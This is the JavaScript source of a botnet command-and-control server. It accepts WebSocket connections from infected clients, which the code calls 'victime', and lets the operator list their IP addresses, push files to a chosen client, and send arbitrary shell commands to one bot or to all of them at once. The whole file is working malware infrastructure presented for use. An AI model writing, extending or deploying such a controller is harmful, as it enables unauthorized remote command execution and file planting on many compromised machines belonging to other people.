#!/usr/bin/env node

const WebSocketServer = require('websocket').server
const http = require('http')
const readline = require('readline-sync')
const colors = require('colors')
const { exec } = require('child_process');
const fs = require('fs-extra')
const {createHmac} = require('crypto');
const port = 8080;

const server = http.createServer(function(request, response) {
    console.log('Received request for ' + request.url)
    response.writeHead(404);
    response.end()
})
server.listen(port, function() {
let asciiart = `
:::::::::   :::::::: ::::::::::: ::::    ::: :::::::::: ::::::::::: 
:+:    :+: :+:    :+:    :+:     :+:+:   :+: :+:            :+:      
+:+    +:+ +:+    +:+    +:+     :+:+:+  +:+ +:+            +:+       
+#++:++#+  +#+    +:+    +#+     +#+ +:+ +#+ +#++:++#       +#+        
+#+    +#+ +#+    +#+    +#+     +#+  +#+#+# +#+            +#+         
#+#    #+# #+#    #+#    #+#     #+#   #+#+# #+#            #+#          
#########   ########     ###     ###    #### ##########     ###
`
console.log(`${asciiart}`.brightBlue)
console.log("Github : https://github.com/bxsic-fr/botnet-js".brightBlue);
console.log("Bob's github (help me to develop this) : https://github.com/6346563751".brightBlue);
console.log()
console.log("Connection port : " + port)
console.log("Command usage : {id} shell_command".brightGreen)
console.log()
})

wsServer = new WebSocketServer({
    httpServer: server,
    autoAcceptConnections: false
})

let connections = []

let initialized = false

const messages_history = []


wsServer.on('request', function(request) {

    const connection = request.accept('echo-protocol', request.origin);
    connections.push(connection)
    let id = parseInt(connections.indexOf(connection))
    messages_history.push('New connection '.random + '['.green + id + ']'.green)
    
    function prompt() {
        let message = readline.question("> ")

        if(message.includes("list")){
            connections.forEach(function(connection) {
                let ip = connection.remoteAddress.split(":");
                ip = ip[ip.length - 1]
                console.log(connections.indexOf(connection) + " - " + ip);
            })
            prompt();
        } if (message.includes("help")) {
            let tabhelp = `
╔══════════════════════════════════════════════╤══════════════════════════════════════════════╗
║                   Commands                   │                  Description                 ║
╠══════════════════════════════════════════════╪══════════════════════════════════════════════╣
║                     list                     │          List all active connections         ║
╟──────────────────────────────────────────────┼──────────────────────────────────────────────╢
║                     help                     │    All commands (other of shell commands)    ║
╟──────────────────────────────────────────────┼──────────────────────────────────────────────╢
║ sendfile {id} {file-path} {client-file-name} │         Send file to specific client         ║
╟──────────────────────────────────────────────┼──────────────────────────────────────────────╢
║             execall {shell-command}             │ Execute a same command for every connections ║
╚══════════════════════════════════════════════╧══════════════════════════════════════════════╝`
            console.log(tabhelp)
            prompt();
        } if (message.includes("sendfile")){

            message = message.split(" ");

            let identifier = message['1'];
            let path = message['2'];
            let filename = message['3'];
            let filecontent = fs.readFileSync(path, 'utf8');
            let key = "ZomEkEyz"

            const hmac = createHmac('sha256', key);
            hmac.update(filecontent);

            let hashdata = hmac.digest('hex');
            let data_array = [message['0'], filename, filecontent, hashdata];
            
            const victime = connections[identifier]
            
            victime.send(data_array)

            prompt();
        } if (message.includes("execall")) {
            connections.forEach(connection => {
                let command = message.split(" ")
                connection.sendUTF(command)
            })
            prompt();
        }
        
        else {

        message = message.split(' ')

        const toconnectid = message['0']

        const victime = connections[toconnectid]

        const command = message.slice(1).join(' ')

        victime.sendUTF(command)
        
        }
    }

    function read_history_and_prompt() {
        messages_history.forEach(x => console.log(x))
        messages_history.length = 0 // rénitialiser le tableau
        prompt()
    }

    connection.addListener("message", function(message) {
        messages_history.push('=========='.rainbow + '['.green + id + ']'.green  + '========='.rainbow)
        messages_history.push(message.utf8Data)
        read_history_and_prompt()
    })

    connection.on('close', function(reasonCode, description) {
        console.log(`${connection.remoteAddress} disconnected. [Reason :${description}]`.red)
    })

    if(!initialized) {
        read_history_and_prompt() // initialiser
        initialized = true
    }
})